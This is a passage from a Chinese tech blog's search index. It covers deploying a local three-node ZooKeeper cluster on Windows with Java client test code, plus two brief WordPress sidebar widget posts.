align="left">zooKeeper的连接超时时间</td></tr><tr><td align="left">zookeeper.sync.time.ms =2000</td><td align="left">zooKeeper集群中leader和follower之间的同步时间</td></tr></tbody></table><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10582660">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 系统架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集群 </tag>
            
            <tag> kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速部署单机 zookeeper 集群（win 环境）</title>
      <link href="/articles/arch/kuai-su-bu-shu-dan-ji-zookeeper-ji-qun/"/>
      <url>/articles/arch/kuai-su-bu-shu-dan-ji-zookeeper-ji-qun/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文不讲zookeeper集群原理，只谈部署步骤。</p><p>默认读者已对zookeeper有最基本的认知，纯粹作为部署笔记，方便回忆。</p><p>另外<strong>本文是基于Windows部署的，Linux的步骤是基本相同的</strong>（只是启动脚本位置不同）。</p><p>严格来说本文部署的是单机伪集群，但一理通百理明，多主机集群和单机伪集群的部署方式相差无几，从入门角度看，使用方式也是大同小异。</p><h2 id="2-环境"><a href="#2-环境" class="headerlink" title="2. 环境"></a>2. 环境</h2><ul><li>JDK ： 1.8</li><li>zookeeper ： 3.4.7</li><li>zookeeper集群规模 ： 3</li><li>zookeeper安装目录 ：<font color="blue">%INSTALL_DIR%</font> = E:\apache\apache-zookeeper（此处定义变量是为了下文方便说明，<strong>实际部署时应使用实际路径而非变量</strong>）</li></ul><h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h2><p>到zookeeper官网下载最新版：<a href="https://zookeeper.apache.org/">https://zookeeper.apache.org/</a></p><p>解压后，复制并重命名到3个目录（每个目录代表zookeeper集群的一台机器）：</p><blockquote><p><font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font><br><font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font><br><font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font></p></blockquote><p>分别复制这三个目录下的配置文件：</p><blockquote><p><font color="blue">%INSTALL_DIR%</font>/<font color="red">zookeeper-x</font>/conf/zoo_sample.cfg</p></blockquote><p>并重命名为：</p><blockquote><p><font color="blue">%INSTALL_DIR%</font>/<font color="red">zookeeper-x</font>/conf/zoo.cfg</p></blockquote><h2 id="4-配置"><a href="#4-配置" class="headerlink" title="4. 配置"></a>4. 配置</h2><p>修改配置文件 <font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font>/conf/zoo.cfg 的参数如下（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>dataDir=<font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font>/data<br>dataLogDir=<font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font>/log<br>clientPort=<font color="green">2181</font><br><font color="green">server.1</font>=localhost:2287:3287<br><font color="purple">server.2</font>=localhost:2288:3288<br><font color="orange">server.3</font>=localhost:2289:3289</p></blockquote><p>修改配置文件 <font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font>/conf/zoo.cfg 的参数如下（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>dataDir=<font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font>/data<br>dataLogDir=<font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font>/log<br>clientPort=<font color="purple">2182</font><br><font color="green">server.1</font>=localhost:2287:3287<br><font color="purple">server.2</font>=localhost:2288:3288<br><font color="orange">server.3</font>=localhost:2289:3289</p></blockquote><p>修改配置文件 <font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font>/conf/zoo.cfg 的参数如下（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>dataDir=<font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font>/data<br>dataLogDir=<font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font>/log<br>clientPort=<font color="orange">2183</font><br><font color="green">server.1</font>=localhost:2287:3287<br><font color="purple">server.2</font>=localhost:2288:3288<br><font color="orange">server.3</font>=localhost:2289:3289</p></blockquote><p>同时，分别在3个<font color="blue">%INSTALL_DIR%</font>/<font color="red">zookeeper-x</font>/data 目录下，<strong>新建一个名为 <font color="red">myid</font> 文件</strong>，其中：</p><blockquote><p><font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font>/data/myid 中的内容为<font color="green">1</font>，对应<font color="green">server.1</font>中的<font color="green">1</font><br><font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font>/data/myid 中的内容为<font color="purple">2</font>，对应<font color="purple">server.2</font>中的<font color="purple">2</font><br><font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font>/data/myid 中的内容为<font color="orange">3</font>，对应<font color="orange">server.3</font>中的<font color="orange">3</font></p></blockquote><p><strong><em>关于zoo.cfg配置文件的部分配置参数说明：</em></strong></p><ul><li>tickTime ： zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，亦即每个 tickTime 时间就会发送一个心跳。</li><li>dataDir ： zookeeper 保存数据的目录，默认情况下，zookeeper 将写数据的日志文件也保存在这个目录。</li><li>clientPort ： 客户端连接 zookeeper 服务器的端口，zookeeper 会监听这个端口，接受客户端的访问请求。</li><li>initLimit ： zookeeper 接受客户端（不是用户连接 zookeeper 服务器的客户端，而是 zookeeper 服务器集群中连接到 Leader 的 Follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。</li><li>syncLimit ： 标识 Leader 与 Follower 之间发送消息，请求和应答时间长度，最长不能超过多少个 tickTime 的时间长度。</li><li>server.A=B:C:D ：<br>　其中：<br>　　A 是一个数字，表示这个是第几号服务器。<br>　　B 是这个服务器的 ip 地址。<br>　　C 是这个服务器与集群中的 Leader 服务器交换信息的端口。<br>　　D 是在执行选举时，服务器相互通信的端口：万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，就是用这个端口。<br>　　如果是（如本文所述的）伪集群的配置方式，由于 B 都是一样，而不同的 zookeeper 实例通信端口号不能一样，此时要给C、D分配不同的端口号。</li></ul><h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5. 运行"></a>5. 运行</h2><p>在 <font color="blue">%INSTALL_DIR%</font> 目录下新建一个 <font color="red">run-all-zk.bat</font> 脚本，内容如下（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>start <font color="blue">%INSTALL_DIR%</font>/<font color="green">zookeeper-1</font>/bin/zkServer.cmd<br>start <font color="blue">%INSTALL_DIR%</font>/<font color="purple">zookeeper-2</font>/bin/zkServer.cmd<br>start <font color="blue">%INSTALL_DIR%</font>/<font color="orange">zookeeper-3</font>/bin/zkServer.cmd</p></blockquote><p>这样只需运行 <font color="red">run-all-zk.bat</font> 脚本，即可启动整个zookeeper集群。</p><p>至此 zookeeper 部署完成 。 </p><p><img src="./01.png"></p><h2 id="6-管理zookeeper节点"><a href="#6-管理zookeeper节点" class="headerlink" title="6. 管理zookeeper节点"></a>6. 管理zookeeper节点</h2><p>若要管理zookeeper节点，推荐使用工具：<font color="red"><a href="https://download.csdn.net/download/lyy289065406/10580686">ZKInspector</a></font></p><p>启动后，输入<font color="blue">连接字符串</font>即可连接到zookeeper： <font color="blue">localhost:2181,localhost:2182,localhost:2183</font></p><p>此工具可以很方便地增删改查zookeeper当前的节点状态和内容。</p><p><img src="./02.png"></p><p><img src="./03.png"></p><h2 id="7-使用Java测试zookeeper集群"><a href="#7-使用Java测试zookeeper集群" class="headerlink" title="7. 使用Java测试zookeeper集群"></a>7. 使用Java测试zookeeper集群</h2><h3 id="7-1-官方样例"><a href="#7-1-官方样例" class="headerlink" title="7.1. 官方样例"></a>7.1. 官方样例</h3><p>官方的Maven原生构件：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.4.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方测试代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>CreateMode<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>WatchedEvent<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>Watcher<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>ZooDefs<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>ZooKeeper<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>data<span class="token punctuation">.</span>Stat<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * apache-zookeeper测试 * &lt;/PRE> * &lt;B>PROJECT : &lt;/B> zookeeper * &lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   2018-08-02 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestZooKeeper</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">TestZooKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">final</span> String CHARSET <span class="token operator">=</span> <span class="token string">"UTF-8"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* 连接到zookeeper集群 */</span>        <span class="token keyword">final</span> String ZK_CONN_STR <span class="token operator">=</span> <span class="token string">"127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> sessionTimeout <span class="token operator">=</span> <span class="token number">300000</span><span class="token punctuation">;</span>        NodeWatcher nodeWatcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NodeWatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// zookeeper节点监视器(当节点发生变化时, 会触发此监视器)</span>        ZooKeeper zk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZooKeeper</span><span class="token punctuation">(</span>ZK_CONN_STR<span class="token punctuation">,</span> sessionTimeout<span class="token punctuation">,</span> nodeWatcher<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*         * 阻塞等待连接到zookeeper集群.         * 若zookeeper已经启动一段时间是不需要循环检测的，此方法目的是兼容zookeeper刚刚启动的情况.         */</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>zk<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>ZooKeeper<span class="token punctuation">.</span>States<span class="token punctuation">.</span>CONNECTED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/* 若zookeeper节点不存在，则创建之 */</span>        String nodePath <span class="token operator">=</span> <span class="token string">"/zk-test-node"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 节点位置</span>        Stat stat <span class="token operator">=</span> zk<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String nodeData <span class="token operator">=</span> <span class="token string">"http://exp-blog.com"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 节点数据</span>            <span class="token comment" spellcheck="true">// 创建一个持久化节点(即在zookeeper服务停止后依然可以保存该节点数据)</span>            <span class="token comment" spellcheck="true">// 与之相对的则是 CreateMode.EPHEMERAL 临时节点(即在zookeeper服务停止后该节点数据丢失)</span>            zk<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">,</span> nodeData<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>CHARSET<span class="token punctuation">)</span><span class="token punctuation">,</span>                     ZooDefs<span class="token punctuation">.</span>Ids<span class="token punctuation">.</span>OPEN_ACL_UNSAFE<span class="token punctuation">,</span> CreateMode<span class="token punctuation">.</span>PERSISTENT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/* 从zookeeper节点上读取数据 */</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> zk<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> stat<span class="token punctuation">)</span><span class="token punctuation">;</span>        String nodeData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> CHARSET<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nodeData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* 断开zookeeper连接 */</span>        zk<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * &lt;PRE>     * zookeeper节点监视器(当节点发生变化时, 会触发此监视器)     * &lt;/PRE>     * &lt;B>PROJECT : &lt;/B> zookeeper     * &lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>      * @version   2018-08-02     * @author    EXP: 272629724@qq.com     * @since     jdk版本：jdk1.6     */</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">NodeWatcher</span> <span class="token keyword">implements</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span>WatchedEvent event<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"path:"</span> <span class="token operator">+</span> event<span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"type:"</span> <span class="token operator">+</span> event<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stat:"</span> <span class="token operator">+</span> event<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-2-Github样例（更精简的zk客户端）"><a href="#7-2-Github样例（更精简的zk客户端）" class="headerlink" title="7.2. Github样例（更精简的zk客户端）"></a>7.2. Github样例（更精简的zk客户端）</h3><p>zkclient的Maven构件：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.github.adyliu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>zkclient<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>zkclient测试代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>github<span class="token punctuation">.</span>zkclient<span class="token punctuation">.</span>ZkClient<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * zkClient测试 * &lt;/PRE> * &lt;B>PROJECT : &lt;/B> zookeeper * &lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   2018-08-02 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestZooKeeperClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/* 连接到zookeeper集群 */</span>        <span class="token keyword">final</span> String ZK_CONN_STR <span class="token operator">=</span> <span class="token string">"127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183"</span><span class="token punctuation">;</span>        ZkClient zkClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZkClient</span><span class="token punctuation">(</span>ZK_CONN_STR<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* 若zookeeper节点不存在，则创建之 */</span>        String nodePath <span class="token operator">=</span> <span class="token string">"/zk-test-node"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 节点位置</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String nodeData <span class="token operator">=</span> <span class="token string">"http://exp-blog.com"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 节点数据</span>            <span class="token comment" spellcheck="true">// 创建一个持久化节点(即在zookeeper服务停止后依然可以保存该节点数据)</span>            <span class="token comment" spellcheck="true">// 与之相对的则是 createEphemeral 临时节点(即在zookeeper服务停止后该节点数据丢失)</span>            zkClient<span class="token punctuation">.</span><span class="token function">createPersistent</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">,</span> nodeData<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/* 从zookeeper节点上读取数据 */</span>        String nodeData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>zkClient<span class="token punctuation">.</span><span class="token function">readData</span><span class="token punctuation">(</span>nodePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nodeData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><ul><li><a href="http://download.csdn.net/download/lyy289065406/10580590">本文全文下载</a></li><li><a href="http://download.csdn.net/download/lyy289065406/10580686">ZKInspector 下载</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 系统架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zookeeper </tag>
            
            <tag> 集群 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 侧栏小挂件：WP Statistics 改版 &quot;文章/访问统计&quot;</title>
      <link href="/articles/website/wp-gua-jian-statistics/"/>
      <url>/articles/website/wp-gua-jian-statistics/</url>
      
        <content type="html"><![CDATA[<h2 id="挂件效果"><a href="#挂件效果" class="headerlink" title="挂件效果"></a>挂件效果</h2><p>由于WP Statistics自带的边栏统计小工具不好看，这是本站在WP Statistics插件基础上扩展的一个WP挂件。其实就是利用WP Statistics统计接口进行重写的一个统计小工具（可再自行修改CSS样式），其效果如下：</p><p><img src="./01.png"></p><h2 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h2><p>此工具需要预装两个插件才能使用：</p><ul><li>Enhanced Text Widget   （支持在前端写PHP的小工具）</li><li>WP-Statistics     （统计模块，用于借用其统计函数）</li></ul><h2 id="挂件下载"><a href="#挂件下载" class="headerlink" title="挂件下载"></a>挂件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10484948">WP-Statistics侧栏统计挂件 下载</a></p></blockquote><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>1、下载后解压</p><p>2、把 statistics.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去style.css也可）</p><p>3、在前端打开Wordpress的仪表盘， 外观 -&gt; 小工具 -&gt; Enhanced Text， 把 statistics.html 的内容拷贝进去即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> WordPress </tag>
            
            <tag> Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 侧栏小挂件：高仿 CSDN 的 &quot;关于我&quot;</title>
      <link href="/articles/website/wp-gua-jian-csdnaboutme/"/>
      <url>/articles/website/wp-gua-jian-csdnaboutme/</url>
      
        <content type="html"><![CDATA[<h2 id="挂件效果"><a href="#挂件效果" class="headerlink" title="挂件效果"></a>挂件效果</h2><p>此挂件是仿照CSDN的侧栏粘性挂件 “关于我” 做的，其效果如下：</p><p><img src="./01.png"></p><h2 id="挂件下载"><a href="#挂件下载" class="headerlink" title="挂件下载"></a>挂件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10564498">WordPress侧边栏 “关于我” 挂件 下载</a></p></blockquote><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>1、下载后解压</p><p>2、把 about-me.css 拷贝到 Wordpress后台的主题目录下，被style.css引用（或者直接拷贝内容进去也可）</p><p>3、在前端打开Wordpress的仪表盘， 外观 -&gt; 小工具 -&gt; 自定义HTML， 把 about-me.html 的内容拷贝进去即可</p><p>4、about-me.html 内的图片地址修改为自己的图片地址即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> WordPress </tag>
            
            <tag> CSDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嵌入式开发学习笔记 (java – c/c++：从入门到入门)</title>
      <link href="/articles/re/qian-ru-shi-kai-fa-xue-xi-bi-ji/"/>
      <url>/articles/re/qian-ru-shi-kai-fa-xue-xi-bi-ji/</url>
      
